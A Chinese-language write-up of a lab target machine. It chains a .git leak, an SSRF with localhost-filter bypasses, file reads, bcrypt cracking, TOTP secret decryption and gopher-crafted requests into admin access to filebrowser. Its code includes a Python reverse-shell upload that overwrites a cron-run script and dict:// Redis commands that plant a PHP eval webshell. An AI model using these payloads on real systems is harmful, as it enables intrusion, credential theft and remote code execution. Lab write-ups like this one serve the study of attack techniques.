---
title: Rd
weight: 6
comments: true
type: docs
---
## 信息搜集

> 端口扫描

![rustscan](./Rd_Yolo.assets/image-20260817164654006.png)

只有22和80端口存活

> 80

80端口是一博客页面，扫描路径，发现这里存在`.git`泄露

![.git](./Rd_Yolo.assets/image-20260817164947586.png)

我使用的是git-dumper工具

```bash
git-dumper http://192.168.0.101/.git/ ./leaked_repo1 
```

查看git log，获取到两个路由还有一份凭据

![git log](./Rd_Yolo.assets/image-20260817172003533.png)

- 路由：

```text
#   /x7k3m9/  -> link preview service (internal tool)
#   /q2v8p1/  -> admin console
```

- 凭据：

```text
RADIANT_USER="radiant"
RADIANT_PASS="Radiant_Maze_2026"
```

经过测试，这份凭据是正确的,但是靶机内部设置了禁止ssh登录，导致无法远程连接

![ssh](./Rd_Yolo.assets/image-20260817211052086.png)

## get flags

先访问路由`/q2v8p1/`，这个会给我们带来用户radiant的模拟shell

![radiant](./Rd_Yolo.assets/image-20260817211816062.png)

考虑过这里可能考察jail绕过，但是这个沙箱过滤特别严格，我无法通过这个路由反弹出shell

接下来看`/x7k3m9/` ，它可以实现ssrf，进入内网环境

首先我在测试过程中，发现它可以让我用file协议读取任意www-data用户能读取的文件

![/etc/passwd](./Rd_Yolo.assets/image-20260817212252754.png)

顺带发现，这里ban了127.0.0.1和localhost这两个主机名

![host](./Rd_Yolo.assets/image-20260817212411728.png)

心里已经有猜测了，我需要绕过这个限制，挖掘靶机内部活动的其它web服务，绕过方法不少，我这里列举几个

- way1

第一个是用IP地址转十进制整数

127.0.0.1可以被转换成2130706433

转换原理是先将IP改成二进制，然后再加权处理变成十进制，详细过程如下：

```plaintext
127.0.0.1 的二进制表示：
127    = 01111111
0      = 00000000
0      = 00000000
1      = 00000001

组合：01111111 00000000 00000000 00000001
二进制 01111111000000000000000000000001
= 2^31 + 2^30 + 2^29 + 2^28 + 2^27 + 2^26 + 2^25 + 2^24 + 1
= 2147483648 + 1073741824 + 536870912 + 268435456 + 
  134217728 + 67108864 + 33554432 + 16777216 + 1
= 2130706433
```

IP地址的十进制在某些绕过类型的题目中非常有效

这样利用

```url
http://192.168.0.101/x7k3m9/?url=http://2130706433:8080/
```

至于内网的端口，我也不太清楚具体是哪些，我这里写了一个爆破命令

```sh
for p in 80 81 3000 4000 5000 8000 8080; do
    echo "===== $p ====="
    curl -s --max-time 5 \
      "http://192.168.0.101/x7k3m9/?url=http%3A%2F%2F2130706433%3A${p}%2F" \
      | head -c 200
    echo
done
```

其实应该写个遍历65535个端口的，我这里就枚举了几个常见的（看到summary就知道我这里的偷懒会给下面的靶机交互挖了坑

枚举后发现8080端口有一个web服务

![8080](./Rd_Yolo.assets/image-20260817220048362.png)

浏览器里访问发现白屏是正常的，可以直接ctrl+u查看源代码，了解到8080内网服务其实是`filebrowser quantum`

![filebrowser](./Rd_Yolo.assets/image-20260817223619873.png)

- other ways

除了转换整数，我还可以用缩写、十六进制、IPV4映射等方法绕过限制，它们的本质都是127.0.0.1，所以也不算什么高级的东西

- `http://127.1:8080/`
- `http://0x7f000001:8080/`
- `http://[::ffff:7f00:1]:8080/`

![example](./Rd_Yolo.assets/image-20260817231322594.png)

考虑到filebrowser是内部服务，应该存在systemd后台配置文件，乱翻了下靶机，留意到这里的`/etc/systemd/system/filebrowser.service`可读，里面是我下一步的起点

![systemd](./Rd_Yolo.assets/image-20260817232420276.png)

继续追进，在`fb.env`中找到了`filebrowser`的`totp secret`

```tex
FILEBROWSER_TOTP_SECRET=m7jfxWC7wtDUkx15bLDgJ8yzTVQQV6DEqMKVDDmtqIU= 
```

![secret](./Rd_Yolo.assets/image-20260817232552586.png)

最后读下数据库，里面有点东西

> 网上看了不少关于filebrowser的靶机题，如果需要恢复totp，我们必须要获取加密的nonce和密文，这几样东西一定会存储在database.db里，关于数据库的路径，我让ai弄了一系列可能的路径字典，遍历后锁定/var/lib/filebrowser/database.db，倒是不算难找

```bash
curl -s "http://192.168.0.101/x7k3m9/?url=file:///var/lib/filebrowser/database.db" > database.db 
```

由于它是`BoltDB database`,用go读取效果最好，这是一份读取的脚本

```go
package main

import (
        "encoding/json"
        "fmt"
        "log"
        "os"

        "go.etcd.io/bbolt"
)

func main() {
        if len(os.Args) != 2 {
                log.Fatal("Usage: dumpdb <database-file>")
        }

        dbPath := os.Args[1]
        db, err := bbolt.Open(dbPath, 0600, nil)
        if err != nil {
                log.Fatal(err)
        }
        defer db.Close()

        err = db.View(func(tx *bbolt.Tx) error {
                return tx.ForEach(func(name []byte, b *bbolt.Bucket) error {
                        fmt.Printf("\n=== Bucket: %s ===\n", string(name))

                        return b.ForEach(func(k, v []byte) error {
                                fmt.Printf("Key: %s\n", string(k))

                                // 尝试解析 JSON 值
                                if len(v) > 0 && (v[0] == '{' || v[0] == '[') {
                                        var data interface{}
                                        if json.Unmarshal(v, &data) == nil {
                                                if jsonBytes, err := json.MarshalIndent(data, "  ", "  "); err == nil {
                                                        fmt.Printf("Value (JSON):\n%s\n", string(jsonBytes))
                                                } else {
                                                        fmt.Printf("Value: %s (len: %d bytes)\n", string(v), len(v))
                                                }
                                        } else {
                                                fmt.Printf("Value: %s (len: %d bytes)\n", string(v), len(v))
                                        }
                                } else {
                                        fmt.Printf("Value: %s (len: %d bytes)\n", string(v), len(v))
                                }
                                fmt.Println()
                                return nil
                        })
                })
        })
        if err != nil {
                log.Fatal(err)
        }
}
```

![database.db](./Rd_Yolo.assets/image-20260820151826507.png)

信息获取到这里基本可以结束

关于那个数据库，我这里整理下会利用到的核心数据

加密密钥:`m7jfxWC7wtDUkx15bLDgJ8yzTVQQV6DEqMKVDDmtqIU=`

加密的 TOTP:`2SCUXcLUU/8HF2KIbmR9WIwpr0LNGkzByjapNobLEIMkqe++dCsWQM3Ni+1tUtMj`

Nonce:`m5rN9JofqFt7EQTg`

**管理员密码哈希**:`$2a$10$yQ7wYFRGycqHMRRpSMXgnOoQAgZM1br5mJNdkdJ7W4ocsDvqSk6xK`

前三条是计算恢复totp用的，最后那个密码哈希是admin的

先爆破那串bcrypt哈希，用rockyou很快,获取到管理员的密码是dimple

![dimple](./Rd_Yolo.assets/image-20260820152248445.png)

接下来解密totp并生成随机6位校验码即可（关于totp相关的处理，网上能搜到通用的方法，我这份脚本是让ai生成的

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64
import time
import hmac
import hashlib
import struct

# 1. Base64解码
key = base64.b64decode("m7jfxWC7wtDUkx15bLDgJ8yzTVQQV6DEqMKVDDmtqIU=")  # 32字节
data = base64.b64decode("2SCUXcLUU/8HF2KIbmR9WIwpr0LNGkzByjapNobLEIMkqe++dCsWQM3Ni+1tUtMj")  # 48字节
nonce = base64.b64decode("m5rN9JofqFt7EQTg")  # 12字节

# 2. 拆分: 前32字节是密文,后16字节是认证标签
ciphertext = data[:-16]
tag = data[-16:]

# 3. AES-GCM解密
aesgcm = AESGCM(key)
plaintext = aesgcm.decrypt(nonce, ciphertext + tag, None)

# 4. 得到 base32 TOTP secret
result = plaintext.decode('utf-8')  # "UMZW3BHVYS4G6TS7RHWFYEAPAXUOYGEC"
print(f"base32 TOTP secret: {result}")
# 1. Base32解码
key = base64.b32decode(result)  # 20字节

# 2. 计算时间计数
counter = int(time.time()) // 30

# 3. HMAC-SHA1
counter_bytes = struct.pack('>Q', counter)
hmac_result = hmac.new(key, counter_bytes, hashlib.sha1).digest()

# 4. 动态截取
offset = hmac_result[-1] & 0x0f
dynamic_code = hmac_result[offset:offset+4]

# 5. 生成6位数字
code_int = struct.unpack('>I', dynamic_code)[0] & 0x7fffffff
totp_code = f"{code_int % 1000000:06d}"

print(f"TOTP code: {totp_code}")

```

接下来我们要利用30s的TOTP代码获取JWT，可以读读这篇[文章](https://blog.csdn.net/gitblog_00245/article/details/151437890)，有个别请求头我们需要注意下，或者说，我们直接审计这份[auth.go](https://gitcode.com/GitHub_Trending/fileb/filebrowser/blob/main/backend/http/auth.go)，里面有登录的路由以及相关参数

![/api/auth/login](./Rd_Yolo.assets/image-20260820183955188.png)

代码分析，了解到这里应该发post请求，但是我前面直接file协议读文件，这个ssrf方法本质上是get请求，因此，我需要换个能发送post请求的伪协议，就比如说[gopher协议](https://blog.csdn.net/qq_50854662/article/details/129180268)(它同样支持GET协议的)

先弄个大概的样子

![example](./Rd_Yolo.assets/image-20260820184355560.png)

这样的伪协议一定行不通，我还需要在上面用url编码处理(温馨提示，务必进行两重url编码，理由是我之前尝试一次编码ssrf失败了，猜想系统内部可能会用php的`curl_init()`解码一次，然后再用`libcurl`解码一次)

```url
curl -s "http://192.168.0.101/x7k3m9/?url=gopher://127.1:8080/_POST%2520%252Fapi%252Fauth%252Flogin%253Fusername%253Dadmin%2520HTTP%252F1.1%250D%250AHost%253A%2520127.1%253A8080%250D%250AX-Password%253A%2520dimple%250D%250AX-Secret%253A%2520088302%250D%250AContent-Length%253A%25200%250D%250AConnection%253A%2520close%250D%250A%250D%250A"
```

这里的totp务必在30s内用了，否则就会过期

这是成功的样子，能返回一串admin账号的cookie,借助这个，我们能实现任意文件读取

![cookie](./Rd_Yolo.assets/image-20260820193249968.png)

任意读取文件的时候，我们构造一个带cookie的get请求包就好

![cookie](./Rd_Yolo.assets/image-20260820201316320.png)

```bash
curl -s "http://192.168.0.101/x7k3m9/?url=gopher://127.1:8080/_GET%2520%252Fapi%252Fresources%253Fpath%253D%252Froot%252Froot.txt%2526source%253D%252F%2526content%253Dtrue%2520HTTP%252F1.1%250D%250AHost%253A%2520127.1%253A8080%250D%250AAuthorization%253A%2520Bearer%2520eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJGaWxlQnJvd3NlciBRdWFudHVtIiwiZXhwIjoxNzg3MjMyNzQxLCJpYXQiOjE3ODcyMjU1NDEsImJlbG9uZ3NUbyI6MSwiUGVybWlzc2lvbnMiOnsiYXBpIjp0cnVlLCJhZG1pbiI6dHJ1ZSwibW9kaWZ5Ijp0cnVlLCJzaGFyZSI6dHJ1ZSwicmVhbHRpbWUiOmZhbHNlLCJkZWxldGUiOnRydWUsImNyZWF0ZSI6dHJ1ZSwiZG93bmxvYWQiOnRydWV9fQ.Uu6bh38WsezabzUJ8QtSHwriLTfzjwaEUyZOuYn495s%250D%250AConnection%253A%2520close%250D%250A%250D%250A"
```

![flags](./Rd_Yolo.assets/image-20260820201606191.png)

## get shells

靶机打到这里还不能算结束，我们得想办法拿到root的shell，这一点倒是不算难搞，前面不是说过靶机上运行的是filebrowser嘛，这个项目支持文件的获取，同时也支持文件的编辑，我大可写个定时任务，间接将shell反弹出来

在前面的任意文件读取中，我们可以再读个`/etc/crontab`，了解到每两分钟会执行一次`/opt/webstats/stats.py`

![crontab](./Rd_Yolo.assets/image-20260820224308734.png)

直接覆盖定时任务我害怕出现bug，干脆覆盖这里的stats.py好了，看上去影响最小

至于相关的api语法，可以查看这份[resource.go](https://gitcode.com/GitHub_Trending/fileb/filebrowser/blob/main/backend/http/resource.go)，写得挺好

![resource.go](./Rd_Yolo.assets/image-20260820225458053.png)

然后这是我ssrf实现任意文件上传的脚本

```python
import urllib.parse, urllib.request, base64, time

JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJGaWxlQnJvd3NlciBRdWFudHVtIiwiZXhwIjoxNzg3MjQ0NDc0LCJpYXQiOjE3ODcyMzcyNzQsImJlbG9uZ3NUbyI6MSwiUGVybWlzc2lvbnMiOnsiYXBpIjp0cnVlLCJhZG1pbiI6dHJ1ZSwibW9kaWZ5Ijp0cnVlLCJzaGFyZSI6dHJ1ZSwicmVhbHRpbWUiOmZhbHNlLCJkZWxldGUiOnRydWUsImNyZWF0ZSI6dHJ1ZSwiZG93bmxvYWQiOnRydWV9fQ.Lc1uWstEJZ6ySGTMPwYwAYRvbzVdjnR2HvX5Hb5XgKo" 
LHOST = "192.168.0.103"
LPORT = 4444

def encode_gopher(raw):
    """将 HTTP 请求编码为 Gopher URL"""
    return "gopher://127.1:8080/_" + urllib.parse.quote(raw, safe='')

def call(method, path, body=b''):
    """发送 SSRF 请求"""
    headers = f'Host: 127.1:8080\r\nAuthorization: Bearer {JWT}\r\nConnection: close\r\n'
    if body:
        headers += f'Content-Length: {len(body)}\r\nContent-Type: text/plain\r\n'
    http_request = (f'{method} {path} HTTP/1.1\r\n{headers}\r\n').encode() + body

    gopher_url = encode_gopher(http_request.decode('latin1'))
    final_url = "http://192.168.0.101/x7k3m9/?url=" + urllib.parse.quote(gopher_url, safe='')

    print(f"[DEBUG] Final URL length: {len(final_url)}")
    return urllib.request.urlopen(final_url, timeout=10).read()

def upload_file(path, content):
    """上传文件到目标路径"""
    return call('POST', f'/api/resources?path={path}&source=%2F&override=true', content)

# ========== 反弹 Shell Payload ==========
shell_code = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{LHOST}',{LPORT}))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
def log_hit(count): return None
'''.encode()

# ========== 攻击流程 ==========
print('[+] Uploading shell...')
upload_file('/opt/webstats/stats.py', shell_code)
print('[+] Shell uploaded! 记得监听端口，等一会儿')
```

成功效果和下图差不多

![win](./Rd_Yolo.assets/image-20260820223848363.png)

## summary

这份靶机真的很棒，难点在于ssrf如何构造伪协议，然后嘞，关于filebrowser的相关api接口协议，还有totp校验，这些都挺考察社工信息搜集能力的，当然，稍强点的ai会自行解决，不过亲力亲为的感觉很不错的

获取到root shell的路线似乎不止这一条吧，其实我整体的方法略微麻烦了一点点，111那边先是通过6379的redis服务写了🐎，获取到www-data的shell，这个时候呢，大可切换到用户radiant(当然可以不用)，然后就是内网穿透或者说直接在靶机里进行和我上面差不多的操作，获取totp等信息，劫持filebrowser服务，最后获取root shell

下面是111写php🐎的过程

```url
dict:///127.1:6379/config%2520set%2520dir%2520/var/www/html
dict:///127.1:6379/config%2520set%2520dbfilename%25201.php
dict:///127.1:6379/set%25201%2520%253C%253F%253Dhighlight_file(__FILE__)%253Beval(%2524_GET%255B1%255D)%253B%253F%253E
dict:///127.1:6379/save
```

看得出来，前面偷得懒，得用后面的麻烦脚本弥补，哈哈，对了，其实作者已经在博客主页留下了hint，可惜，当我打通才想明白

![hints](./Rd_Yolo.assets/image-20260820232734745.png)
